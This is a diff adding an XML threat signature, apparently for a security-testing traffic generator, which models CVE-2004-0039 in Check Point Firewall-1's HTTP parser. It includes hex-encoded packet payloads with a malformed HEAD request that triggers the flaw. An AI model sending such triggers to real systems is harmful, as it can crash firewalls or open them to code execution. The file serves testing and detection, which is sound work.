@@ -1,0 +1,87 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Checkpoint Firewall-1 HTTP Parsing Format String Vulnerabilities"/>
+    <EngDesc display="true" value="A vulnerability exists in the HTTP protocol parser used by several components of Check Point Firewall-1. The vulnerability can be triggered by sending certain malformed fields in an HTTP request, and may be exploited to crash the firewall or to execute code of the attacker&amp;apos;s choice on the firewall. This vulnerability has been described as a format-string problem, however, it has been found that format specifiers are not required to trigger the vulnerability."/>
+    <Intent display="true"/>
+    <Protocol display="true" value="HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Check_Point"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Check_Point_Check_Point_FireWall"/>
+      <item value="Check_Point_Check_Point_VPN-1/FireWall-1"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Check_Point_FireWall_1_4.1"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="FSC20040205-01"/>
+    <CVEID display="true" value="CVE-2004-0039"/>
+    <bugtraqID display="true" value="9581"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="ThreatEx Team"/>
+    <ID display="true" value="980c52582c497aa0353ad78ee708b9a9"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="True"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value=""/>
+    <Authentication display="false" value=""/>
+    <ConfImpact display="false" value=""/>
+    <IntegImpact display="false" value=""/>
+    <AvailImpact display="false" value=""/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value="normal"/>
+    <LastModified display="false" value="633601055154843750"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1213652360" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="I"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="J"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="K"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="L"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="M"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="I"/>
+      <for index="J"/>
+      <for index="K"/>
+      <for index="L"/>
+      <for index="M"/>
+    </for>
+    <for index="E"/>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="007D" Identification="AB8D" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="C299" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="@random(1026,65535)" destPort="$HTTPdestPort" SeqNumber="F8213214" AckNumber="F7390B8A" HeaderLength="08" WindowSize="16D0" Checksum="CCC3" UrgentPointer="0000" Options="0101080A0BA299A4001C063C" Payload="4845414420787878787878787878787878783A2F2F3139322E31382E302E3130302F6E757474696E2F20485454502F312E300D0A436F6E6E656374696F6E3A20436C6F73650D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="" destMac="" pktType="">
+        <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="485454502f312e3120323030204f4b0d0a5365727665723a204170616368650d0a4c6173742d4d6f6469666965643a204d6f6e2c2030322046656220323030342031313a33323a343120474d540d0a455461673a202261396436652d3830302d33643235636631383534383430220d0a4163636570742d52616e6765733a2062797465730d0a436f6e74656e742d4c656e6774683a20350d0a4b6565702d416c6976653a2074696d656f75743d31352c206d61783d3130300d0a436f6e6e656374696f6e3a204b6565702d416c6976650d0a436f6e74656e742d547970653a20746578742f706c61696e0d0a0d0a50776e5421" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
